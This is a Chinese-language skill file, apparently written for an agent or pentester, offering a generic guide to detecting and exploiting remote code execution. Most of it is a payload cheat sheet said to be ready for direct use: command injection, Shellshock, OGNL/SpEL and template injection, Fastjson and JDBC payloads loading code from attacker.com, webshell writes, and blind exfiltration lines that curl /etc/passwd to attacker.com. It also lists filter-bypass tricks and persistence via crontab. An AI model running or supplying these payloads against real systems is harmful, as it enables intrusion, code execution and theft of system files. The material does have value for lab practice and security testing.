---
name: vulhub-rce
description: rce 类型漏洞的通用抽象探测与利用方案
version: 1.0
---

# RCE 抽象化通用渗透与利用指南

## [1] 通用探测思路 (Detection Methodology)

RCE漏洞的入口点通常遵循特定模式。渗透测试人员应优先关注以下抽象路径、参数和配置：

1.  **管理/调试接口**：寻找暴露的、未授权或弱认证的管理端点。常见路径模式包括：
    *   `/admin/`, `/actuator/`, `/console/`, `/manager/`, `/api/admin/`
    *   包含 `debug`, `rest`, `gateway`, `config` 关键词的路径。
    *   **关键启发**：任何允许修改服务器配置（如日志路径、数据目录、功能开关）的接口，都可能成为RCE的跳板。

2.  **API与数据序列化端点**：关注处理用户输入并可能触发后端逻辑的API。
    *   数据绑定端点（如用户注册、数据更新）。
    *   查询接口（如数据库查询、搜索），特别是接受复杂查询语言（如SQL、Elasticsearch DSL）的接口。
    *   文件上传与处理接口，尤其是支持服务端脚本（如Mock脚本、模板）或调用系统命令（如`ImageMagick`、`GhostScript`）的功能。

3.  **表达式注入点**：识别任何可能将用户输入作为代码或表达式进行解析的参数。
    *   **HTTP参数**：特别是 `expression`, `script`, `value`, `filter`, `routing-expression`, `Content-Type` 等。
    *   **配置参数**：通过HTTP请求注入到配置文件中的键值对。
    *   **模板参数**：在渲染页面或返回数据时，用于动态生成内容的字段。

4.  **默认凭证与硬编码令牌**：许多中间件、数据库控制台和框架管理界面存在默认密码或硬编码的API密钥。在请求头（如 `X-API-KEY`）或认证参数中尝试使用这些已知凭证。

5.  **服务暴露**：探测非常规端口上暴露的、无需认证的服务API，例如Docker Remote API (`2375`), 数据库控制台，缓存服务管理端口等。

**核心策略**：将目标应用视为一个“输入转换器”。你的目标是找到一个输入点，使得你提供的“数据”能被系统误解为“指令”（命令、表达式、代码）并执行。

## [2] 经典漏洞原型与 Payload 字典 (Cheat Sheet)

以下Payload已剥离具体CVE编号，按执行上下文分类，可直接用于测试。

### A. 命令注入 (Command Injection)
```http
# 通过参数注入命令（基础）
GET /path?param=`id` HTTP/1.1
GET /path?param=$(id) HTTP/1.1
GET /path?param=||id|| HTTP/1.1

# 通过HTTP头注入
User-Agent: () { :; }; echo; /usr/bin/id

# 利用系统命令参数注入
# 场景：参数最终传递给如`sh -c`、`ssh`、`psql`等
param=value;id
param=value|id|
param=value\nid
param=value\r!id
```

### B. 表达式语言注入 (Expression Language Injection - OGNL, SpEL, JEXL, MVEL)
```http
# 基础探测 - 数学运算
${233*233}
%{233*233}
#{233*233}
*{233*233}
T(java.lang.Runtime).getRuntime().exec('calc')

# OGNL (常见于Struts2等) - 复杂利用链
%{(#context=#attr['struts.valueStack'].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('id'))}

# SpEL (常见于Spring相关)
T(java.lang.Runtime).getRuntime().exec("touch /tmp/success")
#{(new java.lang.ProcessBuilder('id')).start()}
username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("id")]=test

# JEXL / MVEL
''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('touch /tmp/success')
```

### C. 模板注入 (Template Injection - SSTI)
```http
# 基础探测
{{233*233}}
${233*233}
<%= 233*233 %>
${{233*233}}

# Freemarker SSTI
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }

# Jinja2 SSTI (Flask)
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") }}{% endif %}{% endfor %}

# Smarty SSTI
{function name='x'}{php}echo `id`;{/php}{/function}
```

### D. 脚本引擎注入 (Script Engine Injection - Groovy, JavaScript, Lua)
```http
POST /_search HTTP/1.1
Content-Type: application/json

{
  "script_fields": {
    "test": {
      "script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"
    }
  }
}
```
```javascript
// JavaScript (Node.js) - 在Mock或沙箱场景中
const process = this.constructor.constructor('return process')();
process.mainModule.require("child_process").execSync("id").toString()

// Groovy
throw new Exception('id'.execute().text);
```

### E. 数据库相关注入 (Database-related Injection)
```sql
-- JDBC URL注入 (H2 Database)
jdbc:h2:mem:test;INIT=CREATE TRIGGER shell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec("id")\n$$

-- SQL注入至RCE (通过写文件或调用扩展)
';SELECT write_file('/var/www/shell.php', '<?php system($_GET[c]);?>')--
```
```http
# 通过数据库配置执行命令 (Metabase等)
POST /api/setup/validate HTTP/1.1
{"database":"postgres","host":"localhost","port":"5432","dbname":"test?user=test&ssl=true&sslfactory=org.postgresql.ssl.NonValidatingFactory&sslfactoryarg=allow&socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=http://attacker.com/spel.xml"}
```

### F. 反序列化与不安全反射 (Deserialization & Unsafe Reflection)
```json
// Fastjson 类路径加载
{
  "a": {
    "@type": "java.lang.Class",
    "val": "com.sun.rowset.JdbcRowSetImpl"
  },
  "b": {
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://attacker.com/Exploit",
    "autoCommit": true
  }
}
```
```xml
<!-- XML-RPC 命令执行 -->
<methodCall>
  <methodName>system.method</methodName>
  <params><param><string>touch /tmp/success</string></param></params>
</methodCall>
```

### G. 文件处理与协议处理 (File/Protocol Handler)
```bash
# 利用`%pipe%`指令 (Ghostscript)
%!PS
(%pipe%id > /tmp/out) (w) file

# 利用`file://`, `php://`, `gopher://`等包装器
file:///etc/passwd
php://filter/convert.base64-encode/resource=/etc/passwd
```

## [3] 变体与特殊绕过技巧 (Bypass & Tricky Variants)

1.  **空格绕过**：当空格被过滤时，使用以下替代：
    ```
    ${IFS}, ${IFS}, %09 (tab), %0b, %0c, +, <, >, {cmd,args}
    ```
2.  **命令分隔符绕过**：除了`;`和`&`，还可以使用：
    ```
    |, ||, &, &&, %0a (换行), %0d (回车), ` (反引号), $()
    ```
3.  **括号与引号绕过**：当括号或引号被过滤时，尝试：
    *   使用`反引号`执行命令。
    *   在Bash中，使用`${CMD:0:1}`等形式进行字符串拼接。
    *   利用环境变量存储命令字符串：`a=c;b=at;d=/etc/passwd;$a$b $d`
4.  **黑名单关键字绕过**：
    *   **大小写混淆**：`Id`, `iD`
    *   **双写**：`iidd`
    *   **插入特殊字符**：`i\nd`, `i”d”, i’d’
    *   **使用通配符**：`/???/c?t /etc/passwd` (Linux), `c*md` (Windows)
    *   **编码**：Base64, Hex, Unicode (`\u0069\u0064`)
5.  **表达式注入上下文绕过**：
    *   如果直接表达式被拦截，尝试通过**参数名**或**HTTP头**（如`Content-Type`, `X-Forwarded-For`）注入。
    *   利用**二次解析**：先注入一个存储表达式的位置（如配置、日志），再触发另一个功能点去读取和执行它。
    *   **沙箱逃逸**：许多表达式引擎（如OGNL、Groovy）有沙箱限制。利用链通常涉及：
        1.  获取`MemberAccess`或`ClassLoader`对象。
        2.  清除被禁止的类或包名单（`excludedClasses`, `excludedPackageNames`）。
        3.  设置允许静态方法访问（`allowStaticMethodAccess=true`）。
        4.  最后调用`Runtime.exec()`或类似方法。
6.  **无回显利用 (Blind RCE)**：
    *   **时间盲注**：使用`sleep 5`或`ping -c 5 127.0.0.1`观察响应延迟。
    *   **DNS外带 (OOB)**：执行命令如`nslookup $(whoami).attacker.com`或`curl http://attacker.com/$(cat /etc/passwd | base64)`。
    *   **HTTP外带**：使用`wget`, `curl` 将命令结果发送到可控服务器。

## [4] 回显与成功判定基准 (Verification)

成功执行RCE的判定不应依赖于单一特征，而应结合以下多层证据：

1.  **直接命令回显**：
    *   在HTTP响应体、响应头或错误信息中直接出现命令执行结果（如`uid=0(root) gid=0(root) groups=0(root)`）。
    *   响应中出现明显的系统信息（如`/etc/passwd`文件内容、当前路径`pwd`输出、`uname -a`系统信息）。

2.  **间接效果验证**：
    *   **文件操作**：执行`touch /tmp/proof_$(date +%s)`，然后尝试通过其他路径（如目录遍历、文件读取漏洞）访问该文件，或再次执行`ls /tmp/`查看文件是否创建。
    *   **网络操作**：在目标上执行`ping`、`nslookup`或`curl/wget`访问你的监听服务器，在你的服务器上确认收到连接或HTTP请求。
    *   **进程操作**：执行`sleep 5`并观察响应时间是否明显延迟（时间盲注）。

3.  **环境变更验证**：
    *   通过写入Web目录的Webshell（如`echo '<?php phpinfo();?>' > /var/www/html/shell.php`）并访问验证。
    *   修改系统配置（如crontab）并观察后续是否触发。

4.  **错误信息分析**：
    *   命令执行失败也可能产生特征性错误信息（如`bash: xxx: command not found`），这同样可以证明指令被系统shell解析，是RCE存在的强 indicator。

**黄金准则**：最可靠的验证是执行一个能产生**唯一、可观测、与你的输入强关联**的效果。例如，在`/tmp`目录下创建一个包含随机字符串的文件，并成功读取到该文件的内容。避免使用可能因环境差异而失败的通用命令（如`calc.exe`）。